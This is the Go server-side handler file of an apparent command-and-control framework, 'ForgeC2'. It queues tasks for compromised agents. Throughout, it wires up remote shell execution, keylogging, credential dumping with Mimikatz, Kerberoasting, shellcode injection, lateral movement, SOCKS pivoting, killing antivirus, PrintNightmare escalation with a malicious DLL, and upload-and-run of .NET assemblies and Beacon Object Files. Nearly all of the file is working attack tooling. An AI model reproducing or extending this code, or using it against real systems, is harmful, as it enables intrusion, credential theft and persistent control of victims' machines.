package server

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"html/template"
	"io"
	"log/slog"
	"net/http"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
)

func (s *Server) handleShellPage(c *gin.Context) {
	id := c.Param("id")
	var agent db.Agent
	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
		c.String(http.StatusNotFound, "Agent not found")
		return
	}

	if time.Since(agent.LastSeen) > s.offlineThreshold() {
		agent.Status = "offline"
	} else {
		agent.Status = "online"
	}

	stats := s.getNavStats()
	data := gin.H{
		"Title":     fmt.Sprintf("ForgeC2 - Shell %s", agent.Hostname),
		"ActiveNav": "agents",
		"Agent":     agent,
	}
	s.addUserToData(c, data)
	for k, v := range stats {
		data[k] = v
	}

	var contentBuf bytes.Buffer
	if err := s.tmpl.ExecuteTemplate(&contentBuf, "shell_content", data); err != nil {
		slog.Error("Failed to render shell content", "err", err)
		c.String(http.StatusInternalServerError, "Template error")
		return
	}

	data["Content"] = template.HTML(contentBuf.String())
	c.Header("Content-Type", "text/html; charset=utf-8")
	s.tmpl.ExecuteTemplate(c.Writer, "layout.html", data)
}

func (s *Server) handleSendCommand(c *gin.Context) {
	id := c.Param("id")
	cmd := c.PostForm("command")
	shell := c.PostForm("shell")
	if shell == "" {
		shell = "cmd.exe"
	}

	slog.Info("handleSendCommand called", "agent_id", id, "command", cmd)

	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	task, err := s.createTask(id, "shell", cmd, shell, "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create task", "agent_id", id, "error", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}

	slog.Info("Task created successfully", "agent_id", id, "task_id", task.ID, "command", cmd)
	s.dispatchTask(c, task, "send_command", cmd)
}

func (s *Server) handleGetAgentTasks(c *gin.Context) {
	id := c.Param("id")

	var tasks []db.Task
	s.db.Where("agent_id = ?", id).
		Where("type NOT IN ?", []string{"screen_stream_start", "screen_stream_stop", "ls"}).
		Order("created_at desc").Limit(AgentTasksLimit).Find(&tasks)

	var contentBuf bytes.Buffer
	if err := s.tmpl.ExecuteTemplate(&contentBuf, "agent_tasks_list", gin.H{"Tasks": tasks}); err != nil {
		slog.Error("Failed to render tasks", "err", err)
		c.String(http.StatusInternalServerError, "Template error")
		return
	}

	c.Header("Content-Type", "text/html; charset=utf-8")
	c.String(http.StatusOK, contentBuf.String())
}

func (s *Server) handleGetTaskStatus(c *gin.Context) {
	taskID := c.Param("taskId")

	var task db.Task
	if err := s.db.Preload("Agent").First(&task, taskID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "task not found"})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"id":      task.ID,
		"status":  task.Status,
		"result":  task.Result,
		"error":   task.Error,
		"command": task.Command,
		"type":    task.Type,
		"agent":   task.Agent.Hostname,
		"created": task.CreatedAt.Format("2006-01-02 15:04:05"),
	})
}

func (s *Server) handleRequestPS(c *gin.Context) {
	id := c.Param("id")

	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	task, err := s.createTask(id, "ps", "", "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create task", "agent_id", id, "error", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}

	slog.Info("Process list requested", "agent", id)
	s.dispatchTask(c, task, "request_ps", "process list")
}

func (s *Server) handleSuspendProcess(c *gin.Context) {
	id := c.Param("id")
	target := c.PostForm("target")
	if target == "" {
		target = c.PostForm("command")
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "suspend", target, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Suspend requested", "agent", id, "target", target)
	s.dispatchTask(c, task, "suspend_process", target)
}

func (s *Server) handleResumeProcess(c *gin.Context) {
	id := c.Param("id")
	target := c.PostForm("target")
	if target == "" {
		target = c.PostForm("command")
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "resume", target, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Resume requested", "agent", id, "target", target)
	s.dispatchTask(c, task, "resume_process", target)
}

func (s *Server) handleKillProcess(c *gin.Context) {
	id := c.Param("id")
	target := c.PostForm("target")
	if target == "" {
		target = c.PostForm("command")
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "killproc", target, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Kill process requested", "agent", id, "target", target)
	s.dispatchTask(c, task, "kill_process", target)
}

func (s *Server) handleClipboardGet(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "clipboard_get", "", "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Clipboard get requested", "agent", id)
	s.dispatchTask(c, task, "clipboard_get", "")
}

func (s *Server) handleClipboardSet(c *gin.Context) {
	id := c.Param("id")
	data := c.PostForm("data")
	if data == "" {
		data = c.PostForm("command")
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "clipboard_set", data, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Clipboard set requested", "agent", id)
	s.dispatchTask(c, task, "clipboard_set", "")
}

func (s *Server) handleFindFiles(c *gin.Context) {
	id := c.Param("id")
	path := c.PostForm("path")
	pattern := c.PostForm("pattern")
	if path == "" {
		path = c.PostForm("command")
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "find", pattern, "", path, "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Find files requested", "agent", id, "path", path, "pattern", pattern)
	s.dispatchTask(c, task, "find_files", path+" "+pattern)
}

func (s *Server) handleRegGet(c *gin.Context) {
	id := c.Param("id")
	key := c.PostForm("key")
	if key == "" {
		key = c.PostForm("command")
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "reg_get", key, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Reg get requested", "agent", id, "key", key)
	s.dispatchTask(c, task, "reg_get", key)
}

func (s *Server) handleRegSet(c *gin.Context) {
	id := c.Param("id")
	path := c.PostForm("path")
	data := c.PostForm("data")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "reg_set", "", "", path, data, 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Reg set requested", "agent", id, "path", path)
	s.dispatchTask(c, task, "reg_set", path)
}

func (s *Server) handleRegDelete(c *gin.Context) {
	id := c.Param("id")
	key := c.PostForm("key")
	if key == "" {
		key = c.PostForm("command")
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "reg_delete", key, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Reg delete requested", "agent", id, "key", key)
	s.dispatchTask(c, task, "reg_delete", key)
}

func (s *Server) handleReboot(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "reboot", "", "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Reboot requested", "agent", id)
	s.dispatchTask(c, task, "reboot", "")
}

func (s *Server) handleShutdown(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "shutdown", "", "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Shutdown requested", "agent", id)
	s.dispatchTask(c, task, "shutdown", "")
}

func (s *Server) handleListDrives(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "drives", "", "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("List drives requested", "agent", id)
	s.dispatchTask(c, task, "list_drives", "")
}

func (s *Server) handleBeaconNow(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	// Send a lightweight task to force immediate beacon
	task, err := s.createTask(id, "beacon_now", "", "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Force beacon requested", "agent", id)
	s.dispatchTask(c, task, "beacon_now", "")
}

func (s *Server) handleListServices(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "services", "", "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("List services requested", "agent", id)
	s.dispatchTask(c, task, "list_services", "")
}

func (s *Server) handlePortScan(c *gin.Context) {
	id := c.Param("id")
	target := c.PostForm("target")
	if target == "" {
		target = c.PostForm("command")
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "portscan", target, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Portscan requested", "agent", id, "target", target)
	s.dispatchTask(c, task, "portscan", target)
}

func (s *Server) handleNetstat(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "netstat", "", "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Netstat requested", "agent", id)
	s.dispatchTask(c, task, "netstat", "")
}

func (s *Server) handleUsers(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "users", "", "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Users requested", "agent", id)
	s.dispatchTask(c, task, "users", "")
}

func (s *Server) handleAV(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "av", "", "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("AV detect requested", "agent", id)
	s.dispatchTask(c, task, "av", "")
}

func (s *Server) handleDownloadURL(c *gin.Context) {
	id := c.Param("id")
	url := c.PostForm("url")
	dest := c.PostForm("dest")
	if url == "" {
		url = c.PostForm("command")
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "download_url", url, dest, dest, "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Download URL requested", "agent", id, "url", url)
	s.dispatchTask(c, task, "download_url", url+" -> "+dest)
}

func (s *Server) handleUninstall(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "uninstall", "", "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Uninstall requested", "agent", id)
	s.dispatchTask(c, task, "uninstall", "")
}

func (s *Server) handleSetSleep(c *gin.Context) {
	id := c.Param("id")
	sleep := c.PostForm("sleep")
	if sleep == "" {
		sleep = c.PostForm("command")
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "set_sleep", sleep, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Set sleep requested", "agent", id, "sleep", sleep)
	s.dispatchTask(c, task, "set_sleep", sleep)
}

func (s *Server) handleElevate(c *gin.Context) {
	id := c.Param("id")
	cmd := c.PostForm("cmd")
	if cmd == "" {
		cmd = c.PostForm("command")
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "elevate", cmd, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Elevate requested", "agent", id, "cmd", cmd)
	s.dispatchTask(c, task, "elevate", cmd)
}

func (s *Server) handleKillAV(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "kill_av", "", "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Kill AV requested", "agent", id)
	s.dispatchTask(c, task, "kill_av", "")
}

// Keylogger handlers (high-value addition)
func (s *Server) handleStartKeylogger(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	task, err := s.createTask(id, "keylogger_start", "", "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create keylogger start task", "agent_id", id, "error", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}

	s.LogAuditRecord(c, "keylogger_start", "agent", id, "Started keylogger", true, nil)
	slog.Info("Keylogger started", "agent", id)
	s.dispatchTask(c, task, "keylogger_start", "start")
}

func (s *Server) handleStopKeylogger(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	task, err := s.createTask(id, "keylogger_stop", "", "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create keylogger stop task", "agent_id", id, "error", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}

	s.LogAuditRecord(c, "keylogger_stop", "agent", id, "Stopped keylogger", true, nil)
	slog.Info("Keylogger stopped", "agent", id)
	s.dispatchTask(c, task, "keylogger_stop", "stop")
}

func (s *Server) handleDumpKeylogger(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	task, err := s.createTask(id, "keylogger_dump", "", "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create keylogger dump task", "agent_id", id, "error", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}

	s.LogAuditRecord(c, "keylogger_dump", "agent", id, "Dumped keylogger buffer", true, nil)
	slog.Info("Keylogger dump requested", "agent", id)
	s.dispatchTask(c, task, "keylogger_dump", "dump logs")
}

// === High value CS parity: 1(SOCKS),3(creds),4(inject),6(lateral) ===

func (s *Server) handleCredsDump(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "creds", "", "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Creds dump requested", "agent", id)
	s.dispatchTask(c, task, "creds_dump", "")
}

func (s *Server) handleInject(c *gin.Context) {
	id := c.Param("id")
	pidStr := c.PostForm("pid")
	tech := c.PostForm("tech")
	if tech == "" {
		tech = "createremotethread"
	}
	scB64 := c.PostForm("shellcode") // base64 shellcode
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	cmd := pidStr + "|" + tech
	task, err := s.createTask(id, "inject", cmd, "", "", scB64, 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Inject requested", "agent", id, "pid", pidStr, "tech", tech)
	s.dispatchTask(c, task, "inject", cmd)
}

func (s *Server) handleLateral(c *gin.Context) {
	id := c.Param("id")
	spec := c.PostForm("spec")
	if spec == "" {
		spec = c.PostForm("command")
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "lateral", spec, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Lateral movement requested", "agent", id, "spec", spec)
	s.dispatchTask(c, task, "lateral", spec)
}

func (s *Server) handleSocks(c *gin.Context) {
	id := c.Param("id")
	port := c.PostForm("port")
	if port == "" {
		port = c.PostForm("command")
	}
	if port == "" {
		port = "1080"
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	// Command carries the listen port on the *agent*
	task, err := s.createTask(id, "socks", port, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("SOCKS5 requested on agent", "agent", id, "port", port)
	s.dispatchTask(c, task, "socks", port)
}

// handleRerunTask clones an existing task's parameters and creates a new pending task.
// POST /agents/:id/task/:taskId/rerun
func (s *Server) handleRerunTask(c *gin.Context) {
	agentID := c.Param("id")
	taskIDStr := c.Param("taskId")

	if _, ok := s.getAgentOrFail(c, agentID); !ok {
		return
	}

	var taskID uint
	if _, err := fmt.Sscanf(taskIDStr, "%d", &taskID); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid task id"})
		return
	}

	var original db.Task
	if err := s.db.First(&original, taskID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "original task not found"})
		return
	}

	// Only rerun tasks that belong to this agent
	if original.AgentID != agentID {
		c.JSON(http.StatusForbidden, gin.H{"error": "task belongs to different agent"})
		return
	}

	// Don't allow rerun of control/monitoring tasks
	noRerun := map[string]bool{
		"kill_agent": true, "screen_stream_start": true, "screen_stream_stop": true,
	}
	if noRerun[original.Type] {
		c.JSON(http.StatusBadRequest, gin.H{"error": "cannot rerun this task type"})
		return
	}

	// Clone the original task parameters
	newTask, err := s.createTask(agentID, original.Type, original.Command, original.Shell, original.Path, original.Data, original.Offset, original.Size)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}

	slog.Info("Task rerun", "agent", agentID, "original_task", taskID, "new_task", newTask.ID, "type", original.Type)
	s.dispatchTask(c, newTask, "rerun_"+original.Type, fmt.Sprintf("rerun of #%d", taskID))
}

// ── execute-assembly: Upload and execute .NET assembly ─────────────────────
func (s *Server) handleExecuteAssembly(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	// Accept assembly file upload
	file, err := c.FormFile("assembly")
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "assembly file required"})
		return
	}
	if file.Size > MaxUploadSize {
		c.JSON(http.StatusBadRequest, gin.H{"error": fmt.Sprintf("assembly too large: %d bytes (max %d)", file.Size, MaxUploadSize)})
		return
	}
	f, err := file.Open()
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read assembly"})
		return
	}
	defer f.Close()
	data, err := io.ReadAll(f)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read assembly data"})
		return
	}
	b64Data := base64.StdEncoding.EncodeToString(data)

	task, err := s.createTask(id, "execute_assembly", "", "", "", b64Data, 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Execute-assembly requested", "agent", id, "assembly", file.Filename, "size", len(data))
	s.LogAuditRecord(c, "execute_assembly", "agent", id, fmt.Sprintf("Assembly: %s (%d bytes)", file.Filename, len(data)), true, nil)
	s.dispatchTask(c, task, "execute_assembly", file.Filename)
}

// ── kerberoast: Request TGS hashes for all SPNs ────────────────────────────
func (s *Server) handleKerberoast(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "kerberoast", "", "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Kerberoast requested", "agent", id)
	s.LogAuditRecord(c, "kerberoast", "agent", id, "Kerberoast requested", true, nil)
	s.dispatchTask(c, task, "kerberoast", "")
}

// ── mimikatz: Run mimikatz command ─────────────────────────────────────────
func (s *Server) handleMimikatz(c *gin.Context) {
	id := c.Param("id")
	command := c.PostForm("command")
	if command == "" {
		command = "sekurlsa::logonpasswords"
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "mimikatz", command, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Mimikatz requested", "agent", id, "command", command)
	s.LogAuditRecord(c, "mimikatz", "agent", id, fmt.Sprintf("Mimikatz: %s", command), true, nil)
	s.dispatchTask(c, task, "mimikatz", command)
}

// ── elevate_printnightmare: PrintNightmare exploit ─────────────────────────
func (s *Server) handleElevatePrintNightmare(c *gin.Context) {
	id := c.Param("id")
	dllPath := c.PostForm("dll_path")
	if dllPath == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "dll_path is required (upload a malicious DLL first via File Browser)"})
		return
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "elevate_printnightmare", dllPath, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("PrintNightmare exploit requested", "agent", id, "dll", dllPath)
	s.LogAuditRecord(c, "elevate_printnightmare", "agent", id, fmt.Sprintf("PrintNightmare DLL: %s", dllPath), true, nil)
	s.dispatchTask(c, task, "elevate_printnightmare", dllPath)
}

// ── BOF: Upload and execute Beacon Object File ────────────────────────────
func (s *Server) handleBOF(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	file, err := c.FormFile("bof")
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "bof file (.o) required"})
		return
	}
	if file.Size > MaxUploadSize {
		c.JSON(http.StatusBadRequest, gin.H{"error": fmt.Sprintf("BOF too large: %d bytes (max %d)", file.Size, MaxUploadSize)})
		return
	}
	f, err := file.Open()
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read BOF file"})
		return
	}
	defer f.Close()
	data, err := io.ReadAll(f)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read BOF data"})
		return
	}
	args := c.PostForm("args")
	b64Data := base64.StdEncoding.EncodeToString(data)

	task, err := s.createTask(id, "bof", args, "", "", b64Data, 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("BOF execution requested", "agent", id, "file", file.Filename, "size", len(data), "args", args)
	s.LogAuditRecord(c, "bof", "agent", id, fmt.Sprintf("BOF: %s (%d bytes) args=%s", file.Filename, len(data), args), true, nil)
	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID, "message": fmt.Sprintf("BOF %s dispatched", file.Filename)})
}
